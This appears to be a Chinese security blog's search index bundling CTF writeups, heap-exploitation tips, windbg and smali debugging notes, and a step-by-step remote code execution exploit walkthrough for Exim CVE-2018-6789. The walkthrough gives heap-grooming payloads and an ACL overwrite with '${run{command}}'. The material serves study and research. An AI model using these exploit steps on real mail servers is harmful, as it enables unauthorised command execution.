<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[红帽杯2018部分writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018redhat%2F</url>
    <content type="text"><![CDATA[熬了一天，感觉pwn和re的水平退步不少。 PWN这次比赛中的pwn的题目难度一般，3个pwn分别涉及到 栈溢出 ——game server null byte offset-by-one —— shellcode manager 格式化串漏洞 —— Starcraft RPG 中间在漏洞利用过程中也踩到了一些坑（可能是长期没打没有手感，有时间会整理一下）。 REre只看了最简单的icm，感觉自己re方面真是非常菜，赛后重新整理了getFlag的脚本，进行了简化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#!/usr/bin/env python''' pip install cryptography'''from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.backends import default_backenddef getCipherAlgorithm(key, mode): backend = default_backend() cipher = Cipher(algorithms.IDEA(key), mode, backend=backend) return cipherdef encrypt(plainMsg, key, mode): cipher = getCipherAlgorithm(key, mode) encryptor = cipher.encryptor() res = encryptor.update(plainMsg) + encryptor.finalize() return resdef decrypt(cipherMsg, key, mode): cipher = getCipherAlgorithm(key, mode) decryptor = cipher.decryptor() res = decryptor.update(cipherMsg) + decryptor.finalize() return resdef getKey(): from ctypes import * res = [] buf = "" libc = cdll.LoadLibrary("libc.so.6") libc.srand(0x78C819C3) for i in range(16): buf += "&#123;:02x&#125;".format(libc.rand() % 256).decode('hex') return bufdef getCipherText(): secret = [ 0xd0, 0xe0, 0xab, 0x9c, 0xcd, 0x78, 0x5b, 0x54, 0x3d, 0xe4, 0xea, 0x33, 0x51, 0x44, 0x6d, 0x3c, 0x4e, 0xce, 0xdf, 0xb5, 0x41, 0x0, 0x1c, 0xec, 0xe3, 0x1b, 0xc3, 0x8c, 0x91, 0x25, 0x7f, 0x1b, 0x60, 0xfe, 0x35, 0x9c, 0xea, 0x4, 0x4c, 0x87, 0x8d, 0x97, 0x93, 0x5c, 0xb8, 0x9a, 0x70, 0x75, ] buf = "" for i in range(len(secret)): secret[i] = (119-i) ^ secret[i] for i in range(len(secret)): secret[i] = secret[i] ^ (8 - i%8) buf += "&#123;:02x&#125;".format(secret[i]).decode('hex') return bufdef getFlag(): cipherText = getCipherText() key = getKey() mode = modes.ECB() msg = decrypt(cipherText, key, mode) print msgif __name__ == '__main__': getFlag() wcm解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940'''SM4 from https://github.com/yixiangzhike/AlgorithmSM'''from SM4 import *from ctypes import *def getKey(): key = "" libc = cdll.msvcrt libc.srand(0x2872DD1B) for i in range(16): key += "&#123;:02x&#125;".format(libc.rand() % 256) return key.decode('hex')def getCipherText(): secret = [ 0xf4, 0x88, 0x91, 0xc2, 0x9b, 0x20, 0x5b, 0x3, 0xf1, 0xed, 0xf6, 0x13, 0x46, 0x3c, 0x55, 0x81, 0x61, 0xf, 0xff, 0x14, 0x6e, 0x1c, 0x48, 0x28, 0x79, 0x9f, 0x85, 0xaf, 0xc5, 0x58, 0xd, 0xd6, 0xa5, 0xd9, 0x64, 0xfd, 0x46, 0x9, 0x8c, 0xdf, 0x3b, 0xa5, 0x37, 0x62, 0x5a, 0xa6, 0xd2, 0x4b, ] v9 = 51 cipherText = "" while v9 - 51 &lt; 48: cipherText += "&#123;:02x&#125;".format(secret[v9-51] ^ v9) v9 += 1 return cipherText.decode('hex')key = getKey().encode('hex')print "key is &#123;&#125;".format(key)cipherText = getCipherText().encode('hex')print "cipherText is &#123;&#125;".format(cipherText)sm4 = SM4(key=key)msg = sm4.sm4_decrypt(cipherText, SM4_ECB)print msg.decode('hex') Crypto3dlight，当时就考虑用解多元一次方程组的方法来求解，当时搞不动了，后来抽空写了下生成系数矩阵的脚本，迎刃而解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118import numpy as npimport osdef str2arr(str): return [[[(ord(str[i * 8 + j]) &gt;&gt; k &amp; 1) for k in xrange(8)] for j in xrange(8)] for i in xrange(8)]def str2arr_rev(arr): ret = "" for i in xrange(8): for j in xrange(8): ret += chr(int(''.join(map(str, arr[i][j][::-1])), 2)) return retdef arr2str(arr): ret = '' for i in xrange(8): for j in xrange(8): for k in xrange(8): ret += chr(arr[i][j][k]) return retdef arr2str_rev(str2): ret = [[[0 for k in xrange(8)] for j in xrange(8)] for i in xrange(8)] for i in xrange(8): for j in xrange(8): for k in xrange(8): ret[i][j][k] = ord(str2[i*64+j*8+k]) return retdef check(x, y, z): if x &lt; 0 or x &gt; 7 or y &lt; 0 or y &gt; 7 or z &lt; 0 or z &gt; 7: return False return Truedef light(arr, i, j, k, x, y, z, power): # square if check(i + x, j + y, k + z): arr[i + x][j + y][k + z] += power # top right if x != 0 and check(i - x, j + y, k + z): arr[i - x][j + y][k + z] += power # if y != 0 and check(i + x, j - y, k + z): arr[i + x][j - y][k + z] += power if z != 0 and check(i + x, j + y, k - z): arr[i + x][j + y][k - z] += power if x != 0 and y != 0 and check(i - x, j - y, k + z): arr[i - x][j - y][k + z] += power if x != 0 and z != 0 and check(i - x, j + y, k - z): arr[i - x][j + y][k - z] += power if y != 0 and z != 0 and check(i + x, j - y, k - z): arr[i + x][j - y][k - z] += power if x != 0 and y != 0 and z != 0 and check(i - x, j - y, k - z): arr[i - x][j - y][k - z] += powerdef encrypt(flag, power): ret = [[[0 for _ in xrange(8)] for _ in xrange(8)] for _ in xrange(8)] lights = str2arr(flag) for i in range(8): for j in range(8): for k in range(8): if lights[i][j][k] == 1: # bit is 1 for x in range(power): for y in range(power - x): for z in range(power - x - y): light(ret, i, j, k, x, y, z, power - x - y - z) return arr2str(ret)def getMatrix(): A = [[ 0 for i in range(8**3)] for j in range(8**3)] for row in range(len(A)): ord_x = row / 8**2 ord_y = (row - ord_x*(8**2))/8 ord_z = row % 8 A[row][ord_x * 8**2 + ord_y * 8 + ord_z] = 2 if ord_x &gt; 0: A[row][(ord_x-1)* 8**2 + ord_y*8 + ord_z] = 1 if ord_x &lt; 7: A[row][(ord_x+1)* 8**2 + ord_y*8 + ord_z] = 1 if ord_y &gt; 0: A[row][ord_x* 8**2 + (ord_y-1) *8 + ord_z] = 1 if ord_y &lt; 7: A[row][ord_x* 8**2 + (ord_y+1) *8 + ord_z] = 1 if ord_z &gt; 0: A[row][ord_x * 8**2 + ord_y * 8 + ord_z -1 ] = 1 if ord_z &lt; 7: A[row][ord_x * 8**2 + ord_y * 8 + ord_z + 1] = 1 return np.array(A)def getCipher(): flag = "flag&#123;abcdefg_hij_klm_nop_qrst_uvwxyz_0123456789_1234567890__xyz&#125;" shuffle_flag = ''.join(flag[0::2][i] + flag[-1::-2][i] for i in xrange(32)) cipher = encrypt(shuffle_flag, 2) CipherArr =arr2str_rev(cipher) return np.array(CipherArr).flatten()def decrypt(): solvea = np.linalg.solve(getMatrix(), getCipher()) t = [] for a in solvea: if abs(a) &lt; 0.0001: t.append(0) else: t.append(1) flag = "" for i in range(0, len(t), 8): flag += chr(int(''.join(map(str, t[i:i+8]))[::-1], 2)) return ''.join(flag[0::2][i] + flag[-1::-2][i] for i in xrange(32))print decrypt()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>redhat</tag>
        <tag>reverse</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[heap exploit tips]]></title>
    <url>%2F2018%2F04%2F24%2Fheap-exploit-tips%2F</url>
    <content type="text"><![CDATA[1. common tips: environ指向的地址 -30*size 为 main函数的返回地址的栈地址 申请分配large chunk时，会进行 malloc_consolidate，清空fastbins表，进行合并 scanf, printf当输入、输出过长时，会调用malloc、free addr(main_arena)-0x10 = addr(__malloc_hook) malloc、calloc、realloc区别 calloc 在分配后会自动进行清空，libc 2.23版本如果设置 is_mmap不会清空 当realloc(ptr,size)的size不等于ptr的size时 如果申请size&gt;原来size 如果chunk与top chunk相邻，直接扩展这个chunk到新size大小 如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) 如果申请size&lt;原来size 如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变 如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分 当realloc(ptr,size)的size等于0时，相当于free(ptr) 当realloc(ptr,size)的size等于ptr的size，不进行任何操作 2. Heap exploitunlink attack 条件： 存在堆溢出，可以伪造堆块和控制下一个堆块的头部 存在全局指针ptr指向堆块 方法： 伪造堆块 fd=ptr-size*3 bk=ptr-size*2 unlink成功之后 ptr=ptr-size*3 编辑ptr指向的内容，修改ptr指向got表，再编辑ptr即可overwrite got表 12345678910chunk0 malloc返回的ptr chunk1 malloc返回的ptr| | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+| | |fake|fake|fake|fake| D | fake | fake | | | || | |prev|size| FD | BK | A | prev | size&amp;| | | || prev_size |size&amp;Flag|size| | | | T | size | flag | | | || | | | | | | A | | | | | || | | | | | | | | | | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+ |--------new_size--------| fastbin attack house of spirit 伪造chunk，free之后再次申请chunk进行攻击 double free 重复释放同一个chunk，实现类似类型混淆的效果 Arbitrary Alloc 利用：__malloc_hook地址-0x28+5 作为伪造的fd指针（地址错位 )，填充0x13字节+ onegadget_addr 12345678910$2 = (void *(**)(size_t, const void *)) 0x7ff5dd109b10 &lt;__malloc_hook&gt;pwndbg&gt; dqs 0x7ff5dd109b10-0x28+500:0000│ 0x7ff5dd109aed (_IO_wide_data_0+301) ◂— 0xf5dd10826000000001:0008│ 0x7ff5dd109af5 (_IO_wide_data_0+309) ◂— 0x7f02:0010│ 0x7ff5dd109afd ◂— 0xf5dcdcae2000000003:0018│ 0x7ff5dd109b05 (__memalign_hook+5) ◂— 0xf5dcdcaa0000007f04:0020│ 0x7ff5dd109b0d (__realloc_hook+5) ◂— 0x7f05:0028│ 0x7ff5dd109b15 (__malloc_hook+5) ◂— 0x0...07:0038│ 0x7ff5dd109b25 (main_arena+5) ◂— 0xc7604a04a0000000 利用堆漏洞触发堆异常调用 malloc_printerr 打印堆错误，会调用malloc函数，执行one_gadget 满足下列条件的one_gadget 触发更稳定 1230xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL unsorted bin attack 条件： 能够控制 Unsorted Bin Chunk 的 bk 指针(bk = target_addr - 0x10)。 效果： 实现修改任意地址值为一个较大的数值(unsorte bin地址），例如 global_max_fast，例如_IO_list_all（house of orange) House of Lore（small bin attack） 条件： 能够修改small bin中的bk指针 方法： 修改small bin中的bk指针指向伪造的chunk，同时令fake chunk的fd指针不等于small bin中的最后一个chunk 效果： 任意地址写 House Of Einherjar （small或large bin attack, top chunk）free时触发 条件： 需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。 我们需要计算fake_chunk与 被覆盖大小的chunk 地址之间的差，所以需要泄漏地址 prev_size = &amp;fake_chunk - &amp; overwritten_prev_size_chunk_addr 我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测 fake_chunk-&gt;fd = &amp;fake_chunk fake_chunk-&gt;bk = &amp;fake_chunk 方法： 覆盖相邻到地址的prev_size与PREV_INUSE标志位 效果： 任意地址写 House Of Force (top chunk) 条件： 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小 方法： 修改top chunk size域为-1，然后分配指定大小的堆块（计算偏移） 效果： 能够在任意地址分配堆块，实现任意地址写 House Of Orange (top chunk + unsorted bin + FILE attack) 条件： 首先需要目标漏洞是堆上的漏洞 不存在free函数或其他释放堆块的函数 方法： 伪造top chunk的size，满足 伪造的size必须要对齐到内存页 size要大于MINSIZE(0x10) size要小于之后申请的chunk size + MINSIZE(0x10) size的prev inuse位必须为1 效果： control the world 参考： https://ctf-wiki.github.io/ctf-wiki/pwn/heap/]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exim off-by-one 漏洞利用]]></title>
    <url>%2F2018%2F04%2F09%2FExim-off-by-one-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。 基于Meh的思路在特定环境下复现了漏洞利用的过程，最终达成远程命令执行，相关的漏洞环境和验证代码 （https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。 1. 漏洞成因漏洞的成因是b64decode函数在对不规范的base64编码过的数据进行解码时可能会溢出堆上的一个字节，比较经典的off-by-one漏洞。 存在漏洞的b64decode函数部分代码如下： 1234567891011b64decode(const uschar *code, uschar **ptr)&#123;int x, y;uschar *result = store_get(3*(Ustrlen(code)/4) + 1);*ptr = result;/* Each cycle of the loop handles a quantum of 4 input bytes. For the lastquantum this may decode to 1, 2, or 3 output bytes. */ ......&#125; 这段代码解码base64的逻辑是把4个字节当做一组，4个字节解码成3个字节，但是当最后余3个字节（即len(code)=4n+3）时，会解码成2个字节，解码后的总长度为 3n+2 字节，而分配的堆空间的大小为3n+1 ，因此就会发生堆溢出。当然，官方给出的修补方案也很简单，多分配几个字节就可以了。 2. 环境搭建Meh博客中漏洞测试的exim版本是直接通过apt安装的，但是由于debian官方已经修复了仓库中exim的漏洞，可以通过查看软件包源码的patch信息确认： 123456root@skysider:~/poc/exim4-4.86.2# apt-get source exim4......dpkg-source: info: applying 93_CVE-2017-1000368.patchdpkg-source: info: applying fix_smtp_banner.patchdpkg-source: info: applying CVE-2016-9963.patchdpkg-source: info: applying CVE-2018-6789.patch 我们选择下载早期版本的源代码进行编译安装： 12sudo apt-get build-dep exim4wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz 在编译过程中要安装一些依赖库，还需要修改Makefile、新建用户、配置日志文件的权限等，可以参考Dockerfile（https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。 exim可以在运行时指定配置文件，为了触发漏洞以及命令执行，需要配置CRAM-MD5 authenticator以及设置acl_smtp_mail等，配置文件如下： 123456789101112131415161718192021acl_smtp_mail=acl_check_mailacl_smtp_data=acl_check_databegin aclacl_check_mail: .ifdef CHECK_MAIL_HELO_ISSUED deny message = no HELO given before MAIL command condition = $&#123;if def:sender_helo_name &#123;no&#125;&#123;yes&#125;&#125; .endif acceptacl_check_data: acceptbegin authenticatorsfixed_cram: driver = cram_md5 public_name = CRAM-MD5 server_secret = $&#123;if eq&#123;$auth1&#125;&#123;ph10&#125;&#123;secret&#125;fail&#125; server_set_id = $auth1 以调试模式启动exim服务： 1exim -bd -d-receive -C conf.conf 也可以直接使用docker来验证该漏洞（上面的命令为默认启动命令）： 1docker run -it --name exim -p 25:25 skysider/vulndocker:cve-2018-6789 3. 漏洞测试我们使用一个简单的poc来触发漏洞，poc代码如下： 12345678910111213141516171819202122#!/usr/bin/python# -*- coding: utf-8 -*-import smtplibfrom base64 import b64encodeprint &quot;this poc is tested in exim 4.89 x64 bit with cram-md5 authenticators&quot;ip_address = raw_input(&quot;input ip address: &quot;)s = smtplib.SMTP(ip_address)#s.set_debuglevel(1)# 1. put a huge chunk into unsorted bins.ehlo(&quot;mmmm&quot;+&quot;b&quot;*0x1500) # 0x2020# 2. send base64 data and trigger off-by-one#raw_input(&quot;overwrite one byte of next chunk&quot;)s.docmd(&quot;AUTH CRAM-MD5&quot;)payload = &quot;d&quot;*(0x2008-1)try: s.docmd(b64encode(payload)+b64encode(&apos;\xf1\xf1&apos;)[:-1]) s.quit()except smtplib.SMTPServerDisconnected: print &quot;[!] exim server seems to be vulnerable to CVE-2018-6789.&quot; 当执行这段代码时，会触发内存错误 在这个过程中，堆的主要变化如下： 我们可以去观察错误之前的堆，attach到子进程，下图是发送ehlo消息之后的堆： 发送Auth数据之后，我们可以看一下执行完b64decode函数之后的堆： 图中圈出来的两个字节正是我们发送的Auth数据解码出来的最后两个字节，最后一个字节0xf1修改了下一个块的大小，使得原本应该是0x4040（0x6060-0x2020）的unsorted 空闲块变成了0x40f0，通过查看该空闲块紧邻的下一个堆块可以确认当前unsorted bin的空闲块大小是被修改了，因此当从该空闲块分配空间时，malloc函数会检查该空闲块的大小 0x40f0 (低字节的低3位是标志位）与紧邻的下一个堆块标记的前一个堆块的大小 0x4040 是否相等，若不相等，就会触发内存错误。 4. Exim内存管理机制exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了store pool、store block的概念。store pool是一个单链表结构，每一个节点都是一个store block，每个store block的数据大小至少为0x2000，storeblock的结构如下： 123456/* Structure describing the beginning of each big block. */typedef struct storeblock &#123; struct storeblock *next; size_t length;&#125; storeblock; 下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。更多关于exim内存管理机制可以查看store.c。 5. 漏洞利用整体的漏洞利用思路参考漏洞发现者Meh的博客，通过覆盖acl字符串为 ${run{command}} 的方式，达到远程命令执行的目的。因为不同的配置和启动参数可能会导致exim服务在启动运行过程中堆栈布局存在差异，因此漏洞利用脚本仅在给定的环境中测试生效。 下面是漏洞利用的详细步骤： 发送ehlo，布局堆空间 12ehlo(s, "a"*0x1000) # 0x2020ehlo(s, "a"*0x20) 形成一块大小为0x7040的空闲堆块 发送unknown command（包含不可打印字符）从unsorted bin分配内存空间 1docmd(s, "\xee"*0x700) 发送的unknown command 的大小要满足 yield_length &lt; (length + nonprintcount * 3 + 1) ，从而使得发送的unknown command能够调用malloc函数分配一个新的storeblock。 发送ehlo信息回收unknown命令分配的空间 1ehlo(s, "c"*0x2c00) 在回收unknown command占用的内存空间时，由于之前的sender_host_name占用的内存空间已经释放，会发生合并，形成大小为0x2050的空闲块 发送Auth数据，触发漏洞，修改ehlo信息所在堆块的大小 12payload = "d"*(0x2020+0x30-0x18-1)docmd(s, b64encode(payload)+b64encode("\xf1\xf1")[:-1]) 发送Auth数据伪造下一个块的块头信息，绕过释放sender_host_name所在堆块时的内存检查 12payload2 = 'm'*0x70+p64(0x1f41) # modify fake sizedocmd(s, b64encode(payload2)) 释放sender_host_name所在堆块，同时为了不释放其他storeblock，发送包含无效字符的信息 1ehlo(s, "skysider+") 发送Auth数据，修改overlapped所在storeblock的next指针，令其指向acl字符串所在的storeblock 123payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + p8(0x80)try_addr = p16(try_addr*0x10+4) # to changedocmd(s, b64encode(payload3)+b64encode(try_addr)[:-1]) 由于地址随机化，acl所在的storeblock高位字节未知（在docker环境下，低12bit为0x480不变），但是原始的next指针指向的storeblock与要修改的storeblock高位字节相同，仅低位3字节不同，因此可以采用局部overwrite，只需要爆破12bit即可。 发送ehlo消息释放所有的storeblock 1ehlo(s, &quot;released&quot;) 此时unsorted bin表中存在多个空闲块，如下图所示，其中框出来的空闲块就是包含acl的storeblock 覆盖acl字符串 12345payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)payload4 += 't'*(0x1f80-len(payload4))auth(s, b64encode(payload4)+'ee')payload5 = "a"*0x78 + "$&#123;run&#123;" + command + "&#125;&#125;\x00"auth(s, b64encode(payload5)+"ee") 发送第一个auth消息之后，unsorted bin表如下图所示 接着再分配合适的空间时，就可以获取目标storeblock所在的堆块，覆盖其中的acl字符串 触发acl检查 1s.sendline(&quot;MAIL FROM: &lt;test@163.com&gt;&quot;) 至此就可以远程执行命令，完整的漏洞利用脚本见exp.py （https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下： 注：该漏洞利用脚本仅用于交流学习与安全研究，请勿用于非法用途。 参考： https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/ https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>cve-2018-6789</tag>
        <tag>off-by-one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windbg常用命令]]></title>
    <url>%2F2017%2F07%2F29%2Fwindbg%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[命令介绍windbg支持三种类型的命令，标准命令、元命令和扩展命令。 标准命令提供最基本的调试功能，不区分大小写，如k，g，dt，bp等 元命令提供标准命令没有提供的功能，也内建在调试引擎中，以 “.“ 开头，如.sympath, .reload等 扩展命令用于扩展某一方面的调试功能，实现在动态加载的扩展模块中，以 ! 开头，如 !analyze等（需要将第三方dll文件放到winext目录，使用时先用.load xxx.dll加载，然后使用!xxx使用扩展模块功能）。 查看帮助 ? —— 打印出所有标准命令 .help —— 打印出所有元命令 .chain —— 给出一个扩展命令集的链表 !&lt;module_name&gt;.help —— 查看扩展模块帮助 .hh —— 打开windbg的chm帮助文件 断点相关 bp &lt;address&gt; —— 设置软件断点，针对某个地址，例如 bp c87fb320, bp edgehtml!ProcessCSSText，当edgehtml!ProcessCSSText位置发生变化时，断点的位置不变 bu &lt;symbol&gt; ——设置延迟断点，针对符号，例如 bu edgehtml!ProcessCSSText，当符号地址变化时，对应的断点地址也会变化 bm &lt;reg&gt; —— 设置符号断点，支持匹配表达式，例如 bm edgehtml!Process* ba &lt;access&gt; &lt;size&gt; &lt;addr&gt; —— 设置处理器断点，access包括 e（执行）、r（读）、w（写），例如 ba w4 0xcccccccc bl —— 列出所有断点 be &lt;index&gt; —— 激活指定编号断点 bd &lt;index&gt; —— 禁止断点 bc &lt;index&gt; —— 清除断点 读写/搜索内存 !address —— 查看进程的所有内存页属性 !address —summary，显示进程的内存统计信息 !address 7ffd8000 ，查看7ffd8000地址处内存页属性 d &lt;type&gt; &lt;address range&gt; ——根据指定的类型查看存储在某地址中的数据 da —— 显示ASCII字符，每行最多显示48字符，例如 da rip, da rip L4, da rip rip+16 db —— 显示字节值和ASCII字符 dw —— 显示字值（2字节） dd —— 显示双字，默认长度为32 Dwords，dd poi(ebp+4)，poi——解引用指针 dD —— 显示双精度浮点数（8字节），默认 15 个数字 df —— 显示单精度浮点数（4字节），默认 16个数字 dq —— 显示四字值（8字节） du —— 显示Unicode字符串 ds —— 显示ASCII字符串 d&lt;type&gt;s &lt;address range&gt; —— 打印地址上的二进制值，同时搜索符号信息 dds 0xdeafbeaf L20 —— 打印0xdeafbeaf开始的0x20个双字二进制值，并检索符号 dqs 0xdeadbeafdeadbeaf—— 打印0xdeafbeaf开始的16（默认值）个四字二进制值，并检索符号 e &lt;type&gt; &lt;address&gt; &lt;value&gt; —— 修改指定内存中的数据 ea 0x445634 &quot;abc&quot; ——在0x445634地址写入ASCII字符串abc，不包含结束符0 eza 0x445634 &quot;abc&quot; —— 在0x445634地址写入ASCII字符串abc， 包含结束符0 eu 0x445634 “abc” —— 在0x445634地址写入Unicode字符串abc，不包含结束符0 ezu 0x445634 “abc”—— 在0x445634地址写入Unicode字符串abc，包含结束符0 ed nCounter 80 —— 修改变量nCounter的值为80 ew 00007ff9a9ddfc06 cc —— 修改00007ff9`a9ddfc06处的双字节为0x00cc .writemem &lt;file&gt; &lt;address range&gt; —— 将指定内存的内容写入文件中 .writemem D:\\Test\\0041a5e4.bin 0041a5e4 L1000 ，将内存地址处0x0041a5e4后面0x1000长度的内容拷贝存储到D:\Test\0041a5e4.bin中 S \[&lt;options&gt;\] &lt;range&gt; &lt;values&gt; —— 搜索内存 s -w 55230000 L0x100 0x1212 0x2212 ，在起始地址0x55230000之后的0x100个单位内搜索0x1212 0x2212 0x1234系列的起始地址 s -u 52230000 52270000 &quot;web&quot; ， 在55230000和55270000之间搜索Unicode字符串“web” s -d 55230000 L0x100 0xdeadbeaf，在起始地址0x55230000之后的0x100个单位内搜索0xdeadbeaf 读写寄存器 r [[&lt;reg&gt; [= &lt;expr&gt;]]]—— 查看或设置寄存器 r —— 查看所有寄存器值 r eax —— 查看eax值 r rax = rip —— 设置rax的值为rip值 符号加载与查看 .symopt —— 显示所有符号选项 .reload —— 重载符号表 ld * —— 加载模块的符号信息 ld * —— 为所有模块加载符号信息 ld kernel32 —— 为kernel32加载符号信息 x [&lt;*|module&gt;!]&lt;*|symbol&gt; —— 查看符号信息 x *! ，列出所有模块的符号信息 x edgehtml!，列出edgehtml模块的符号信息 x edgehtml!CDOM*，列出edgehtml模块中所有以CDOM开始的符号信息 lm —— 列出所有模块的信息 lmv m ntdll—— 查看ntdll的加载信息（简略） lmvm &lt;module name&gt; —— 查看指定模块的详细信息 !dlls -l—— 按照加载顺序列出所有加载模块 !dlls -c &lt;function_name&gt; —— 查找函数所在模块 ln &lt;addr&gt; —— 查看地址addr处或附近的符号信息 调用堆栈 k &lt;num&gt;—— 显示当前调用堆栈 k 5，显示最近5层函数调用信息 kb 4，打印出前3个函数参数的当前调用堆栈 kD，从当前esp（rsp）开始，向高地址方向搜索符号（等价于 dds esp或dqs rsp） .frame —— 显示当前栈帧 .frame 4 —— 显示编号为n的栈帧 !uniqstack —— 显示所有线程的调用堆栈 查看堆 !heap -s —— 显示进程堆的个数 dt _HEAP 001400000 —— 选取一个堆地址，打印该堆的内存结构 !heap -a 001400000 —— 选取一个堆地址，打印堆结构 调试执行 g——继续执行 gH，强制让调试器返回已经处理了这个异常 gN，强制让调试器返回没有处理这个异常 gu，执行到当前函数完成时停下，遇到ret指令停下 wt —— Trace and watch data， 在函数起始地址处执行该命令，跟踪并打印该函数内部调用过程 ctrl+break —— 暂停正在运行的程序 p —— 单步执行（step over) p 2，单步执行2条指令 pc (step to next call)， 执行到下一个函数调用处停下 pa 7c801b0b ( step to address)，执行到7c801b0b处停下 pt，step到下一条ret指令 t—— 单步步入（step into） tc —— 执行到下一个call指令处停下 ta 7c801b0b，执行到7c801b0b处停下 tb，执行到分支指令处（calls、returns、jumps、loops）停下 tt，trace到下一条ret指令 查看汇编 u —— 反汇编 u ，反汇编当前ip寄存器地址后的8条指令 ub ，反汇编当前ip寄存器地址的前8条指令 u main+0x29 L30，反汇编main+0x29地址的后30条指令 uf CTest::add ，反汇编CTest类的add函数 uf /c main，查看main中的函数调用有哪些 查看数据类型与局部变量 dt —— 打印类型信息 dt ntdll!\_IMAGE\_DOS\_HEADER，打印ntdll中的_IMAGE_DOS_HEADER结构 dt nRet，打印局部变量nRet的类型与值 dt myApp!g\_app，打印myApp进程里全局变量g_app的内存布局 dt WindbgTest!CTest 0x0041f8b4，将0x0041f8d4地址处内容按照模块WindbgTest的CTest结构来解析 dt -b -r3 &lt;structure&gt;，-b 递归显示所有子类型信息，-r指定递归显示深度 dv—— 显示局部变量 诊断 !analyze -v—— 详细显示当前异常信息 !analyze -hang —— 诊断线程调用栈上是否有任何线程阻塞了其他线程 !analyze -f —— 查看异常分析信息，尽管调试器未诊断出异常 进程与线程 !peb —— 格式化输出PEB（Process Environment Block）信息 !teb —— 格式化输出TEB（Thread Environment Block）信息 !tls -1 —— 显示当前线程的所有slot信息 | —— 列出所有调试进程 |N，查看序号为N的调试进程 |Ns，切换序号为N的进程为当前调试进程 ~ —— 列出所有线程 ~*k —— 列出所有线程堆栈信息 ~. —— 查看当前线程 ~0 —— 查看主线程 ~# —— 查看导致当前事件或异常的线程 ~N —— 查看N号线程 ~Ns —— 切换序号为N的线程为当前调试线程 ~Nf —— 冻结序号为N的线程 ~Nu —— 解冻序号为N的线程 ~Nn —— Suspend序号为N的线程 ~Nm —— Resume序号为N的线程 参考： http://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>调试</tag>
        <tag>windbg</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac下进行smali动态调试]]></title>
    <url>%2F2017%2F07%2F16%2Fmac%E4%B8%8B%E8%BF%9B%E8%A1%8Csmali%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[第一种方法（jeb） 在模拟器或者真机中安装并运行apk 以调试模式启动应用 12adb shell dumpsys activity top | head // 获取package name和activity nameadb shell am start -D -n packagename/.activityname 在jeb中设置断点，点击debug，选择设备和对应的调试进程 第二种方法（Android Studio + Smalidea） 使用apktool或者Android Crack Tool解包apk 将解包的工程导入到Android Studio中 以调试模式启动应用 1adb shell am start -D -n packagename/.MainActivity 启动monitor，选中调试应用，开启8700端口 在smali中设置断点，并且设置远程调试（Run-&gt;Edit Configurations-&gt; + -&gt; remote，设置端口为8700），点击debug]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>调试</tag>
        <tag>smali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[x86汇编——jmp指令]]></title>
    <url>%2F2017%2F05%2F25%2Fx86%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94jump%E6%8C%87%E4%BB%A4%2F</url>
